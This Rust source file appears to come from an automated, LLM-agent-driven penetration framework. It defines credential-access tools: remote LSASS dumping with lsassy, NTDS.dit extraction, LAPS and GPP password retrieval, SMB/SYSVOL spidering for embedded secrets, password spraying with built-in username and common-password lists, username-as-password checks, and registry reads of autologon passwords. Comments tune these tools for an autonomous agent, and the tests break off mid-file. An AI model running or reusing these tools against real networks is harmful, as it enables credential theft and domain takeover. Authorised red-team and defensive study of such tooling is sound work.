//! Miscellaneous credential access tool executors (lsassy, domain admin
//! checker, GPP, SYSVOL, LAPS, LDAP descriptions, SMB spider, NTDS,
//! password policy, password spray, username-as-password, credman, autologon).

use anyhow::Result;
use ares_core::models::is_always_disabled_account;
use serde_json::Value;

use crate::args::{optional_bool, optional_i64, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Read a caller-supplied users wordlist and return a sanitized temp-file path
/// with AD built-in always-disabled accounts (Guest, krbtgt, DefaultAccount,
/// WDAGUtilityAccount) stripped. Returns `(sanitized_path, owns_temp)` where
/// `owns_temp` indicates the caller must delete the path on exit.
///
/// If the file can't be read or no entries are filtered, the original path is
/// returned unchanged so callers don't pay the rewrite cost.
fn sanitize_spray_userlist(users_file: &str) -> (String, bool) {
    let Ok(contents) = std::fs::read_to_string(users_file) else {
        return (users_file.to_string(), false);
    };
    let mut filtered_any = false;
    let kept: Vec<&str> = contents
        .lines()
        .filter(|line| {
            let user = line.trim();
            if user.is_empty() {
                return true;
            }
            if is_always_disabled_account(user) {
                filtered_any = true;
                return false;
            }
            true
        })
        .collect();
    if !filtered_any {
        return (users_file.to_string(), false);
    }
    // Per-call counter so concurrent calls within the same process (tests,
    // overlapping spray dispatches) don't race on the same tmp path and
    // overwrite each other's filtered userlists.
    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let seq = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let tmp = format!(
        "/tmp/spray_users_filtered_{}_{}.txt",
        std::process::id(),
        seq
    );
    if std::fs::write(&tmp, kept.join("\n")).is_err() {
        return (users_file.to_string(), false);
    }
    (tmp, true)
}

/// Minimum jitter (seconds) between spray attempts when caller does not
/// supply `delay_seconds`. Keeps at least a small gap between authentication
/// attempts so logon spikes do not all land in the same observation window.
const SPRAY_DEFAULT_JITTER_SECS: i64 = 1;

/// Safety buffer subtracted from `lockout_threshold` when computing the
/// allowed attempts-per-account budget. Keeps spraying one attempt below the
/// lockout line in case any account already has stale failed attempts.
const SPRAY_LOCKOUT_BUFFER: i64 = 1;

/// Dump LSASS credentials remotely via `lsassy`.
pub async fn lsassy(args: &Value) -> Result<ToolOutput> {
    let domain = optional_str(args, "domain");
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;
    let method = optional_str(args, "method");

    let mut cmd = CommandBuilder::new("lsassy")
        .flag_opt("-d", domain)
        .flag("-u", username);

    if let Some(h) = hash {
        let h = if h.contains(':') {
            h.to_string()
        } else {
            format!(":{h}")
        };
        cmd = cmd.flag("-H", h);
    } else if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }

    cmd = cmd.arg(target);
    cmd = cmd.flag_opt("-m", method);

    cmd.timeout_secs(120).execute().await
}

/// Check a single credential against SMB on a target via `netexec smb`.
///
/// Returns standard netexec output — look for `[+]` (valid cred) and
/// `(Pwn3d!)` (local admin).
pub async fn smb_login_check(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    // password OR hash — both optional. The worker credential_resolver
    // injects whichever exists in state; if neither does (the LLM probed a
    // username for which no cred has been discovered), fail soft with a
    // structured stdout message instead of throwing. Hard-erroring caused
    // the LLM to "Assistance requested" and burn ~30k tokens reasoning about
    // a missing-credential field; returning a quiet zero-result line lets
    // the agent move on without a tool failure escalation.
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    if password.is_none() && hash.is_none() {
        return Ok(ToolOutput {
            stdout: format!(
                "smb_login_check: no credential resolved for {username}@{domain} (neither password nor hash in state); skipping login attempt.\n"
            ),
            stderr: String::new(),
            exit_code: Some(0),
            success: true,
        });
    }
    let cred_args = credentials::netexec_creds(Some(username), password, hash, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .timeout_secs(60)
        .execute()
        .await
}

/// Check for admin access on targets via `netexec smb`.
///
/// netexec automatically reports `(Pwn3d!)` in its output when the
/// credential has local admin access — no extra flag needed.
pub async fn domain_admin_checker(args: &Value) -> Result<ToolOutput> {
    let targets = required_str(args, "targets")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");

    let cred_args = credentials::netexec_creds(username, password, hash, domain);

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(targets)
        .args(cred_args)
        .timeout_secs(120)
        .execute()
        .await
}

/// Search for Group Policy Preferences passwords via `netexec smb -M gpp_autologin`.
pub async fn gpp_password_finder(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "gpp_password")
        .timeout_secs(120)
        .execute()
        .await
}

/// Spider SYSVOL for scripts and config files via `netexec smb -M spider_plus`.
///
/// After the spider runs, reads downloaded text files and appends their contents
/// to the output so the agent can search for embedded credentials.
pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    let mut output = CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "spider_plus")
        .flag("-o", "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400")
        .timeout_secs(300)
        .execute()
        .await?;

    // Append downloaded file contents (same logic as smbclient_spider)
    let extra = read_spider_downloads(target).await;
    if !extra.is_empty() {
        output.stdout.push_str(&extra);
    }

    Ok(output)
}

/// Dump LAPS passwords via `netexec ldap -M laps`.
pub async fn laps_dump(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = optional_str(args, "password");
    let nt_hash = optional_str(args, "nt_hash");

    if password.is_none() && nt_hash.is_none() {
        anyhow::bail!("laps_dump requires either 'password' or 'nt_hash'");
    }

    let cred_args = credentials::netexec_creds(Some(username), password, nt_hash, Some(domain));

    CommandBuilder::new("netexec")
        .arg("ldap")
        .arg(target)
        .args(cred_args)
        .flag("-M", "laps")
        .timeout_secs(120)
        .execute()
        .await
}

/// Search for user descriptions containing credentials via `ldapsearch`.
///
/// `domain` controls the base DN (the partition being searched).
/// `bind_domain` (optional) overrides the domain in the bind DN
/// (`user@bind_domain`). Use when the credential belongs to a different
/// domain than the one being queried. Defaults to `domain`.
pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let domain = required_str(args, "domain")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let bind_domain = optional_str(args, "bind_domain");
    let base_dn = optional_str(args, "base_dn");
    let ticket_path = optional_str(args, "ticket_path");

    let computed_base_dn = match base_dn {
        Some(dn) => dn.to_string(),
        None => domain
            .split('.')
            .map(|part| format!("DC={part}"))
            .collect::<Vec<_>>()
            .join(","),
    };

    let ldap_uri = format!("ldap://{target}");

    let mut cmd = CommandBuilder::new("ldapsearch")
        .flag("-H", &ldap_uri)
        .timeout_secs(120);

    if let Some(ccache) = ticket_path {
        cmd = cmd.env("KRB5CCNAME", ccache).arg("-Y").arg("GSSAPI");
    } else {
        let u = username.ok_or_else(|| anyhow::anyhow!("missing required arg: username"))?;
        let p = password.ok_or_else(|| anyhow::anyhow!("missing required arg: password"))?;
        let auth_domain = bind_domain.unwrap_or(domain);
        let bind_dn = format!("{u}@{auth_domain}");
        cmd = cmd.arg("-x").flag("-D", &bind_dn).flag("-w", p);
    }

    cmd.flag("-b", &computed_base_dn)
        .arg("(&(objectClass=user)(description=*))")
        .arg("sAMAccountName")
        .arg("description")
        .arg("userPrincipalName")
        .execute()
        .await
}

/// Spider SMB shares for interesting files via `netexec smb -M spider_plus`.
///
/// After the spider runs, reads the metadata JSON and any downloaded text files,
/// appending their contents to the output so the agent can see actual file data.
pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let pattern = optional_str(args, "pattern");
    let depth = optional_i64(args, "depth");

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    let mut opts = "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400".to_string();
    if let Some(p) = pattern {
        opts.push_str(&format!(" PATTERN={p}"));
    }
    if let Some(d) = depth {
        opts.push_str(&format!(" DEPTH={d}"));
    }

    let mut output = CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "spider_plus")
        .flag("-o", &opts)
        .timeout_secs(300)
        .execute()
        .await?;

    // Append downloaded file contents
    let extra = read_spider_downloads(target).await;
    if !extra.is_empty() {
        output.stdout.push_str(&extra);
    }

    Ok(output)
}

/// Read spider_plus downloaded files and metadata, returning text to append to output.
///
/// spider_plus saves metadata to `/root/.nxc/modules/nxc_spider_plus/{ip}.json`
/// and downloads files to `/root/.nxc/modules/nxc_spider_plus/{ip}/`.
async fn read_spider_downloads(target: &str) -> String {
    let spider_dir = format!("/root/.nxc/modules/nxc_spider_plus/{target}");
    let metadata_path = format!("{spider_dir}.json");

    let mut extra = String::new();

    // Include metadata JSON (file listing per share)
    if let Ok(meta) = tokio::fs::read_to_string(&metadata_path).await {
        extra.push_str("\n\n=== Spider Metadata (files found per share) ===\n");
        extra.push_str(&meta);
    }

    // Walk the download directory and include text file contents
    if tokio::fs::metadata(&spider_dir).await.is_err() {
        return extra;
    }

    extra.push_str("\n\n=== Downloaded File Contents ===\n");
    let mut files_read = 0usize;
    let mut dirs_to_walk = vec![spider_dir.clone()];

    const TEXT_EXTS: &[&str] = &[
        "txt",
        "xml",
        "ini",
        "conf",
        "cfg",
        "ps1",
        "bat",
        "cmd",
        "vbs",
        "js",
        "py",
        "sh",
        "json",
        "yaml",
        "yml",
        "csv",
        "log",
        "reg",
        "inf",
        "pol",
        "asp",
        "aspx",
        "config",
        "properties",
    ];

    while let Some(dir) = dirs_to_walk.pop() {
        let mut dir_entries = match tokio::fs::read_dir(&dir).await {
            Ok(e) => e,
            Err(_) => continue,
        };
        while let Ok(Some(entry)) = dir_entries.next_entry().await {
            let path = entry.path();
            if path.is_dir() {
                dirs_to_walk.push(path.to_string_lossy().to_string());
                continue;
            }
            let ext = path
                .extension()
                .and_then(|e| e.to_str())
                .unwrap_or("")
                .to_lowercase();
            if !TEXT_EXTS.contains(&ext.as_str()) {
                continue;
            }
            if let Ok(contents) = tokio::fs::read_to_string(&path).await {
                // Skip empty files — SYSVOL often has many 0-byte .txt
                // placeholders that fill the file cap before reaching
                // high-value scripts (secret.ps1, etc.)
                if contents.is_empty() {
                    continue;
                }
                let rel = path
                    .strip_prefix(&spider_dir)
                    .unwrap_or(&path)
                    .to_string_lossy();
                extra.push_str(&format!("\n--- {rel} ---\n"));
                // Cap per-file output at 8KB to avoid blowing up context
                if contents.len() > 8192 {
                    let mut end = 8192;
                    while !contents.is_char_boundary(end) {
                        end -= 1;
                    }
                    extra.push_str(&contents[..end]);
                    extra.push_str("\n... [truncated]\n");
                } else {
                    extra.push_str(&contents);
                }
                files_read += 1;
                if files_read >= 50 {
                    extra.push_str("\n... [50 file limit reached, remaining files omitted]\n");
                    break;
                }
            }
        }
        if files_read >= 50 {
            break;
        }
    }

    extra
}

/// Extract NTDS.dit secrets via `impacket-secretsdump -ntds drsuapi`.
pub async fn ntds_dit_extract(args: &Value) -> Result<ToolOutput> {
    let domain = optional_str(args, "domain");
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;

    let (auth_string, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-secretsdump")
        .arg("-ntds")
        .arg("drsuapi")
        .args(extra_args)
        .arg(&auth_string)
        .timeout_secs(180)
        .execute()
        .await
}

/// Retrieve the domain password policy via `netexec smb --pass-pol`.
pub async fn password_policy(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .arg("--pass-pol")
        .timeout_secs(120)
        .execute()
        .await
}

/// Spray a single password across a user list via `netexec smb`.
///
/// Refuses to run unless the caller has supplied a `lockout_threshold` (from
/// `password_policy`) or explicitly set `acknowledge_no_policy=true`. This
/// prevents an over-eager agent from chaining multiple sprays and locking
/// every targeted account before discovering the policy.
pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let users_file = optional_str(args, "users_file");
    let password = optional_str(args, "password");
    let use_common_passwords = optional_bool(args, "use_common_passwords").unwrap_or(false);
    let domain = required_str(args, "domain")?;
    let delay_seconds = optional_i64(args, "delay_seconds");
    let lockout_threshold = optional_i64(args, "lockout_threshold");
    let attempts_used = optional_i64(args, "attempts_used_per_account").unwrap_or(0);
    let acknowledge_no_policy = optional_bool(args, "acknowledge_no_policy").unwrap_or(false);

    if let Some(refusal) =
        check_spray_budget(lockout_threshold, attempts_used, acknowledge_no_policy)
    {
        return Ok(refusal);
    }

    // Use provided file or generate a default wordlist. When the caller
    // supplies a users_file, strip AD built-in always-disabled accounts so
    // we don't burn badPwdCount budget on Guest et al.
    let tmp_file;
    let mut owns_filtered = false;
    let wordlist_path = if let Some(uf) = users_file {
        let (path, owns) = sanitize_spray_userlist(uf);
        owns_filtered = owns;
        path
    } else {
        tmp_file = format!("/tmp/spray_pw_{}.txt", std::process::id());
        std::fs::write(&tmp_file, DEFAULT_SPRAY_USERNAMES)?;
        tmp_file
    };

    let tmp_password_file;
    let password_arg = match (password, use_common_passwords) {
        (Some(p), _) => p.to_string(),
        (None, true) => {
            tmp_password_file = format!("/tmp/spray_pwlist_{}.txt", std::process::id());
            std::fs::write(&tmp_password_file, DEFAULT_SPRAY_PASSWORDS)?;
            tmp_password_file
        }
        (None, false) => anyhow::bail!(
            "password_spray requires either 'password' or 'use_common_passwords=true'"
        ),
    };

    let jitter = delay_seconds
        .unwrap_or(SPRAY_DEFAULT_JITTER_SECS)
        .to_string();

    let result = CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .flag("-u", &wordlist_path)
        .flag("-p", &password_arg)
        .flag("-d", domain)
        .arg("--continue-on-success")
        .flag("--jitter", &jitter)
        .timeout_secs(300)
        .execute()
        .await;

    // Clean up temp file if we created one
    if users_file.is_none() || owns_filtered {
        let _ = std::fs::remove_file(&wordlist_path);
    }
    if password.is_none() && use_common_passwords {
        let _ = std::fs::remove_file(&password_arg);
    }

    result
}

/// Enforce the lockout-aware preconditions for `password_spray`. Returns
/// `Some(refusal_output)` when the call must be blocked, `None` when the
/// caller is clear to spray.
fn check_spray_budget(
    lockout_threshold: Option<i64>,
    attempts_used: i64,
    acknowledge_no_policy: bool,
) -> Option<ToolOutput> {
    match lockout_threshold {
        Some(t) => {
            // A threshold of 0 in AD means "no lockout" — spray freely.
            if t <= 0 {
                return None;
            }
            let budget = t - attempts_used - SPRAY_LOCKOUT_BUFFER;
            if budget < 1 {
                return Some(spray_refusal(format!(
                    "Refusing password_spray: lockout budget exhausted (threshold={t}, \
                     attempts_used_per_account={attempts_used}, safety_buffer={SPRAY_LOCKOUT_BUFFER}, \
                     remaining={budget}). Wait for the AD observation window to reset, \
                     reset attempts_used_per_account to 0, then resume."
                )));
            }
            None
        }
        None if acknowledge_no_policy => None,
        None => Some(spray_refusal(
            "Refusing password_spray: no lockout policy provided. Run password_policy \
             first and pass lockout_threshold (and attempts_used_per_account if accounts \
             already have failed logons this window). To override when policy retrieval \
             is impossible, set acknowledge_no_policy=true — but expect lockouts."
                .to_string(),
        )),
    }
}

fn spray_refusal(message: String) -> ToolOutput {
    ToolOutput {
        stdout: message,
        stderr: String::new(),
        exit_code: None,
        success: false,
    }
}

/// Common AD usernames for fallback when no users_file is provided.
///
/// `guest`, `defaultaccount`, `wdagutilityaccount`, `krbtgt` are intentionally
/// excluded — they ship `userAccountControl & ACCOUNTDISABLE` set, so spraying
/// them never succeeds and just bumps badPwdCount on shared lockout policies.
const DEFAULT_SPRAY_USERNAMES: &str = "\
Administrator\nadmin\n\
sql_svc\nsvc_sql\nsqlservice\nsvc_mssql\n\
svc_backup\nbackup\n\
svc_web\nwebservice\n\
svc_iis\niis_svc\n\
svc_exchange\nexchange\n\
svc_admin\nsvc_test\n\
testuser\ntest\n\
user1\nuser2\nuser3\n\
sam.wilson\njohn.smith\njohn.smith\n\
alice.jones\nsarah.connor\nbrian.davis\nedward.davis\n\
carol.lane\njames.lane\ntim.lane\n\
diana.torres\njoe.morgan\n\
steve.baker\nrichard.baker\n\
jdoe\nrobert.davis\ntom.green\n\
michelle\nkarl.davidson\nvictor.torres\n\
jeff.baker\ntony.baker\n\
paul.jackson\nlaura.chen\nmark.reed\n\
sql_admin\ndb_admin\n\
webadmin\nnetadmin\n\
helpdesk\nsupport\nservice\n";

/// Common AD passwords for fallback low-and-slow spraying when the orchestrator
/// explicitly requests a common-password pass instead of a single known value.
const DEFAULT_SPRAY_PASSWORDS: &str = "\
Password123!\n\
Welcome1\n\
Welcome123\n\
Summer2024!\n\
Summer2025!\n\
Winter2024!\n\
Winter2025!\n\
Spring2025!\n\
Autumn2025!\n\
Company123!\n\
Changeme123!\n\
P@ssw0rd\n\
P@ssw0rd!\n\
Password1\n";

/// Test each username as its own password via `netexec smb --no-bruteforce`.
///
/// `excluded_users` (optional) is a comma- or whitespace-separated list of
/// usernames the orchestrator already saw locked out. They are dropped from
/// the wordlist before netexec runs so a re-spray doesn't keep pinging an
/// already-locked principal (each ping bumps badPwdCount and prolongs the
/// AD lockout window).
pub async fn username_as_password(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let users_file = optional_str(args, "users_file");
    let domain = required_str(args, "domain")?;
    let excluded_users = optional_str(args, "excluded_users").unwrap_or("");

    // Use provided file or generate a default wordlist. Caller-supplied
    // wordlists are filtered to drop AD built-in always-disabled accounts so
    // we don't waste badPwdCount budget on Guest et al.
    let tmp_file;
    let mut owns_filtered = false;
    let mut wordlist_path = if let Some(uf) = users_file {
        let (path, owns) = sanitize_spray_userlist(uf);
        owns_filtered = owns;
        path
    } else {
        tmp_file = format!("/tmp/spray_users_{}.txt", std::process::id());
        std::fs::write(&tmp_file, DEFAULT_SPRAY_USERNAMES)?;
        tmp_file
    };

    // Drop any usernames the orchestrator already observed locked out.
    let (after_excl, owns_excluded) = drop_excluded_users(&wordlist_path, excluded_users);
    if owns_excluded {
        if owns_filtered {
            let _ = std::fs::remove_file(&wordlist_path);
        }
        wordlist_path = after_excl;
        owns_filtered = true;
    }

    let result = CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .flag("-u", &wordlist_path)
        .flag("-p", &wordlist_path)
        .flag("-d", domain)
        .arg("--no-bruteforce")
        .arg("--continue-on-success")
        .timeout_secs(300)
        .execute()
        .await;

    // Clean up temp file if we created one (default fallback or filtered copy)
    if users_file.is_none() || owns_filtered {
        let _ = std::fs::remove_file(&wordlist_path);
    }

    result
}

/// Drop usernames listed in `excluded_users` (comma/whitespace separated)
/// from the wordlist at `path`. Returns `(path_to_use, owns_new_file)`.
/// Case-insensitive match; preserves original line order. If `excluded_users`
/// is empty or no entries match, returns the input path unchanged.
fn drop_excluded_users(path: &str, excluded_users: &str) -> (String, bool) {
    let excluded: std::collections::HashSet<String> = excluded_users
        .split(|c: char| c == ',' || c.is_whitespace())
        .filter(|s| !s.is_empty())
        .map(|s| s.to_lowercase())
        .collect();
    if excluded.is_empty() {
        return (path.to_string(), false);
    }
    let Ok(contents) = std::fs::read_to_string(path) else {
        return (path.to_string(), false);
    };
    let mut filtered_any = false;
    let kept: Vec<&str> = contents
        .lines()
        .filter(|line| {
            let trimmed = line.trim();
            if trimmed.is_empty() {
                return true;
            }
            if excluded.contains(&trimmed.to_lowercase()) {
                filtered_any = true;
                return false;
            }
            true
        })
        .collect();
    if !filtered_any {
        return (path.to_string(), false);
    }
    // Make the temp filename unique per call: parallel callers (and parallel
    // unit tests) share the process and would otherwise overwrite each other.
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let tmp = format!("/tmp/spray_users_excl_{}_{}.txt", std::process::id(), nanos);
    if std::fs::write(&tmp, kept.join("\n")).is_err() {
        return (path.to_string(), false);
    }
    (tmp, true)
}

/// Enumerate Credential Manager entries via `netexec smb -x "cmdkey /list"`.
pub async fn check_credman_entries(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-x", "cmdkey /list")
        .timeout_secs(120)
        .execute()
        .await
}

/// Query Winlogon autologon registry values via `netexec smb -x "reg query"`.
pub async fn check_autologon_registry(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    let reg_cmd = r#"reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword"#;

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-x", reg_cmd)
        .timeout_secs(120)
        .execute()
        .await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_i64, optional_str, required_str};
    use crate::credentials;
    use serde_json::json;

    // --- lsassy hash formatting ---

    #[test]
    fn lsassy_hash_without_colon_gets_prefix() {
        let hash = "aabbccdd";
        let h = if hash.contains(':') {
            hash.to_string()
        } else {
            format!(":{hash}")
        };
        assert_eq!(h, ":aabbccdd");
    }

    #[test]
    fn lsassy_hash_with_colon_stays_as_is() {
        let hash = "aad3b435:aabbccdd";
        let h = if hash.contains(':') {
            hash.to_string()
        } else {
            format!(":{hash}")
        };
        assert_eq!(h, "aad3b435:aabbccdd");
    }

    #[test]
    fn lsassy_requires_username() {
        let args = json!({"target": "192.168.58.1"});
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn lsassy_requires_target() {
        let args = json!({"username": "admin"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn lsassy_optional_method() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "method": "comsvcs"
        });
        assert_eq!(optional_str(&args, "method"), Some("comsvcs"));
    }

    #[test]
    fn lsassy_no_method() {
        let args = json!({"target": "192.168.58.1", "username": "admin"});
        assert!(optional_str(&args, "method").is_none());
    }

    // --- ldap_search_descriptions ---

    #[test]
    fn base_dn_computation_from_domain() {
        let domain = "contoso.local";
        let computed_base_dn: String = domain
            .split('.')
            .map(|part| format!("DC={part}"))
            .collect::<Vec<_>>()
            .join(",");
        assert_eq!(computed_base_dn, "DC=contoso,DC=local");
    }

    #[test]
    fn base_dn_computation_three_levels() {
        let domain = "child.contoso.local";
        let computed_base_dn: String = domain
            .split('.')
            .map(|part| format!("DC={part}"))
            .collect::<Vec<_>>()
            .join(",");
        assert_eq!(computed_base_dn, "DC=child,DC=contoso,DC=local");
    }

    #[test]
    fn base_dn_explicit_overrides_computation() {
        let base_dn = Some("OU=Users,DC=contoso,DC=local");
        let domain = "contoso.local";
        let computed = match base_dn {
            Some(dn) => dn.to_string(),
            None => domain
                .split('.')
                .map(|part| format!("DC={part}"))
                .collect::<Vec<_>>()
                .join(","),
        };
        assert_eq!(computed, "OU=Users,DC=contoso,DC=local");
    }

    #[test]
    fn ldap_bind_dn_format() {
        let username = "admin";
        let domain = "contoso.local";
        let bind_dn = format!("{username}@{domain}");
        assert_eq!(bind_dn, "admin@contoso.local");
    }

    #[test]
    fn ldap_uri_format() {
        let target = "192.168.58.1";
        let ldap_uri = format!("ldap://{target}");
        assert_eq!(ldap_uri, "ldap://192.168.58.1");
    }

    #[test]
    fn ldap_search_requires_all_fields() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "P@ss",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "target").is_ok());
        assert!(required_str(&args, "username").is_ok());
        assert!(required_str(&args, "password").is_ok());
        assert!(required_str(&args, "domain").is_ok());
    }

    // --- netexec_creds helper ---

    #[test]
    fn netexec_creds_for_domain_admin_checker() {
        let cred_args =
            credentials::netexec_creds(Some("admin"), Some("P@ss"), None, Some("contoso.local"));
        assert_eq!(
            cred_args,
            vec!["-u", "admin", "-p", "P@ss", "-d", "contoso.local"]
        );
    }

    #[test]
    fn netexec_creds_with_hash_for_domain_admin_checker() {
        let cred_args = credentials::netexec_creds(
            Some("admin"),
            None,
            Some("aabbccdd"),
            Some("contoso.local"),
        );
        assert_eq!(
            cred_args,
            vec!["-u", "admin", "-H", ":aabbccdd", "-d", "contoso.local"]
        );
    }

    #[test]
    fn domain_admin_checker_requires_targets() {
        let args = json!({"username": "admin"});
        assert!(required_str(&args, "targets").is_err());
    }

    // --- gpp_password_finder ---

    #[test]
    fn gpp_password_finder_all_required() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "P@ss",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "target").is_ok());
        assert!(required_str(&args, "username").is_ok());
        assert!(required_str(&args, "password").is_ok());
        assert!(required_str(&args, "domain").is_ok());
    }

    // --- laps_dump auth-arg validation gate ---

    #[tokio::test]
    async fn laps_dump_rejects_missing_password_and_nt_hash() {
        // Validation runs before netexec spawn — neither password nor
        // nt_hash supplied means we bail with a clear error message rather
        // than letting netexec fail anonymously.
        let args = json!({
            "target": "192.168.58.10",
            "username": "alice",
            "domain": "contoso.local",
        });
        let err = super::laps_dump(&args).await.unwrap_err();
        assert!(
            err.to_string()
                .contains("requires either 'password' or 'nt_hash'"),
            "unexpected error: {err}"
        );
    }

    // --- DEFAULT_SPRAY_USERNAMES ---

    #[test]
    fn default_spray_usernames_is_non_empty() {
        assert!(!super::DEFAULT_SPRAY_USERNAMES.is_empty());
    }

    #[test]
    fn default_spray_usernames_contains_administrator() {
        assert!(super::DEFAULT_SPRAY_USERNAMES.contains("Administrator"));
    }

    #[test]
    fn default_spray_usernames_contains_service_accounts() {
        assert!(super::DEFAULT_SPRAY_USERNAMES.contains("sql_svc"));
        assert!(super::DEFAULT_SPRAY_USERNAMES.contains("svc_backup"));
    }

    #[test]
    fn default_spray_usernames_excludes_disabled_builtins() {
        let entries: Vec<&str> = super::DEFAULT_SPRAY_USERNAMES
            .lines()
            .map(|l| l.trim())
            .filter(|l| !l.is_empty())
            .collect();
        for disabled in ["guest", "krbtgt", "defaultaccount", "wdagutilityaccount"] {
            assert!(
                !entries.iter().any(|e| e.eq_ignore_ascii_case(disabled)),
                "disabled built-in {disabled} must not appear in default spray wordlist"
            );
        }
    }

    // --- password_spray ---

    #[test]
    fn password_spray_delay_seconds_parsing() {
        let args = json!({
            "target": "192.168.58.1",
            "password": "P@ss",
            "domain": "contoso.local",
            "delay_seconds": 5
        });
        assert_eq!(optional_i64(&args, "delay_seconds"), Some(5));
    }

    #[test]
    fn password_spray_no_delay() {
        let args = json!({
            "target": "192.168.58.1",
            "password": "P@ss",
            "domain": "contoso.local"
        });
        assert!(optional_i64(&args, "delay_seconds").is_none());
    }

    #[test]
    fn password_spray_requires_target() {
        let args = json!({"password": "P@ss", "domain": "contoso.local"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn password_spray_requires_password() {
        let args = json!({"target": "192.168.58.1", "domain": "contoso.local"});
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn password_spray_requires_domain() {
        let args = json!({"target": "192.168.58.1", "password": "P@ss"});
        assert!(required_str(&args, "domain").is_err());
    }

    // --- ntds_dit_extract ---

    #[test]
    fn ntds_dit_extract_auth_with_password() {
        let (auth_string, extra_args) = credentials::impacket_auth(
            Some("contoso.local"),
            "admin",
            Some("P@ss"),
            None,
            "192.168.58.1",
        );
        assert_eq!(auth_string, "contoso.local/admin:P@ss@192.168.58.1");
        assert!(extra_args.is_empty());
    }

    #[test]
    fn ntds_dit_extract_auth_with_hash() {
        let (auth_string, extra_args) = credentials::impacket_auth(
            Some("contoso.local"),
            "admin",
            None,
            Some("aabbccdd"),
            "192.168.58.1",
        );
        assert_eq!(auth_string, "contoso.local/admin@192.168.58.1");
        assert_eq!(extra_args, vec!["-hashes", ":aabbccdd"]);
    }

    // --- smbclient_spider ---

    #[test]
    fn smbclient_spider_optional_pattern() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "P@ss",
            "domain": "contoso.local",
            "pattern": "*.kdbx"
        });
        assert_eq!(optional_str(&args, "pattern"), Some("*.kdbx"));
    }

    #[test]
